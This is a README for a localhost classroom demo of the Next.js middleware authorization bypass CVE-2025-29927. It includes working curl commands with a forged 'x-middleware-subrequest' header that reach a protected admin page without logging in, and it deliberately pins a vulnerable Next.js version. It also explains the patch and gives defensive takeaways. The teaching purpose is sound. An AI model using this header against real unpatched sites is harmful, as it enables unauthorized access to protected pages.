# CVE-2025-29927 — Next.js Middleware Authorization Bypass (local demo)

An educational, **localhost-only** demonstration of
[CVE-2025-29927](https://nextjs.org/blog/cve-2025-29927) for a university
cybersecurity course.

The vulnerability lets an attacker **skip Next.js middleware entirely** by
sending a forged `x-middleware-subrequest` request header. If middleware is your
only authorization gate, an unauthenticated attacker reaches protected pages.

> ⚠️ **Safety:** This app pins a deliberately **vulnerable** Next.js
> (`15.2.2`). Run it only on `localhost`. Do **not** deploy the vulnerable build
> anywhere reachable from the internet.

---

## What's in here

| Route | Protection | Behavior under the bypass |
|-------|-----------|---------------------------|
| `/admin` | middleware **only** | ❌ exposed — attacker gets the page |
| `/login` | — | stub login that sets the `session` cookie |

- `middleware.ts` — checks the `session` cookie and redirects unauthenticated
  users to `/login`. This is the gate the CVE lets an attacker skip.
- `app/admin/page.tsx` — no internal check; relies on middleware alone, so the
  forged header exposes it.

---

## Run it

```bash
npm install
npm run dev
# http://localhost:3000
```

In a browser: visiting `/admin` with no session bounces you to `/login`.
Click **Log in** (stub — any values) to set the cookie, then `/admin` loads.

---

## How to demo it (live, ~2 minutes)

Open **two terminals**: one runs the server, one runs the demo.

**Terminal A — start the (vulnerable) server:**

```bash
npm install          # first time only
npm run dev          # leave running; serves http://localhost:3000
```

**Terminal B — run the demo script:**

```bash
./demo.sh
```

It fires the two requests and prints only the signal — status code, redirect
target, and whether the admin page leaked. Expected output on the vulnerable
build:

```
[1] Honest user, NO session cookie      GET /admin
  HTTP 307  ->  /login?from=%2Fadmin
[2] Attacker forges the header          GET /admin   (+ forged header)
  HTTP 200
  >>> BYPASS SUCCEEDED: admin page served with no session cookie
```

Talking point for step 2: *"No session cookie, no login — yet we get `200 OK`
and the admin page, because the forged header made Next.js skip the middleware
entirely."*

**Then show the fix.** In Terminal A, stop the server (Ctrl-C) and upgrade:

```bash
npm install next@15.2.3
rm -rf .next
npm run dev
```

Re-run `./demo.sh` — step 2 now shows `HTTP 307 -> /login` and `bypass failed
(this is a PATCHED build — good)`. Restore the vulnerable build for the next run:

```bash
npm install next@15.2.2 --save-exact
rm -rf .next
```

> **Prefer a browser?** Visit `/admin` (redirects to `/login`), click **Log in**
> to set the cookie, then `/admin` loads. `curl` is used for the attack because a
> browser won't let you add the forged header to a normal navigation.

### Running the requests by hand

If you'd rather type the requests instead of using `demo.sh`, use these. They
print just the status line (and, for the attack, the proof) — not the whole HTML
page.

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/admin
```

```bash
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3000/admin | grep -o "Welcome, authenticated admin"
```

> **zsh tip:** paste the commands **without** the `#` comment lines. In zsh the
> parentheses in a comment like `(307)` are treated as a glob and throw
> `zsh: no matches found` / `unknown file attribute`. The `curl` lines above have
> no comments, so they paste cleanly.
>
> Use `curl -i` only if you want to *see* the raw response headers + HTML. The
> long `<script>self.__next_f...>` blob in that output is Next.js's React Server
> Components payload (normal framework output), not anything in this app.

The sections below repeat the same two requests with the raw `curl -i` form
and explain why the patch works.

---

## The demo: before (vulnerable, Next 15.2.2)

The project ships pinned to the vulnerable `15.2.2`. The forged header payload
is the middleware's name (`middleware`, because `middleware.ts` is at the project
root) repeated 5 times, separated by `:` — the unpatched code skips middleware
once that name count reaches its recursion limit of 5.

> If you put middleware at `src/middleware.ts`, use `src/middleware` instead.

**1. Normal unauthenticated request → redirected to /login**

```bash
curl -i http://localhost:3000/admin
# HTTP/1.1 307 Temporary Redirect
# location: /login?from=%2Fadmin
```

**2. Forged-header request → middleware skipped, admin page served**

```bash
curl -i \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://localhost:3000/admin
# HTTP/1.1 200 OK
# ...<h1>Welcome, authenticated admin</h1>...   <-- BYPASS: no session cookie needed
```

The `200 OK` with the admin page body is the vulnerability: an unauthenticated
request reached a route that middleware was supposed to protect.

---

## The demo: after (patched)

Upgrade to a patched release (`15.2.3`+ on the 15.2 line; also fixed in
`14.2.25`, `13.5.9`, `12.3.5`):

```bash
npm install next@15.2.3
rm -rf .next
npm run dev
```

Re-run the **same** forged-header request:

```bash
curl -i \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://localhost:3000/admin
# HTTP/1.1 307 Temporary Redirect   <-- bypass no longer works
# location: /login?from=%2Fadmin
```

Restore the vulnerable build for the "before" demo again with
`npm install next@15.2.2 --save-exact && rm -rf .next`.

---

## Why the patch works

The unpatched server **trusts** an incoming `x-middleware-subrequest` header.
That header exists only to stop Next's own internal subrequests from re-running
middleware infinitely — it was never meant to come from the outside.

The patch adds a secret: on startup Next generates a random per-process id and
attaches it (`x-middleware-subrequest-id`) to its *own* internal subrequests. An
incoming `x-middleware-subrequest` is now honored only if it carries the matching
secret id. An external attacker can't know that random value, so a forged header
is ignored and middleware runs normally.

You can see both sides in the installed source:

- vulnerable: `node_modules/next/dist/server/web/sandbox/sandbox.js` counts the
  header segments and skips middleware at depth 5.
- patched: `node_modules/next/dist/server/lib/server-ipc/utils.js` drops
  `x-middleware-subrequest` unless `x-middleware-subrequest-id` matches the
  process secret.

---

## Takeaways

1. **Never make middleware your only authorization boundary.** Enforce
   authorization again at the resource — the page, the route handler, and the
   data layer — so a skipped middleware does not mean a skipped auth check.
2. **Keep framework dependencies patched.** This whole class of request-smuggling
   / header-trust bug is fixed by staying current.
3. Treat all client-supplied headers as untrusted, including ones that "look
   internal."

## References

- Next.js advisory: https://nextjs.org/blog/cve-2025-29927
- GitHub advisory: https://github.com/advisories/GHSA-f82v-jwr5-mffw
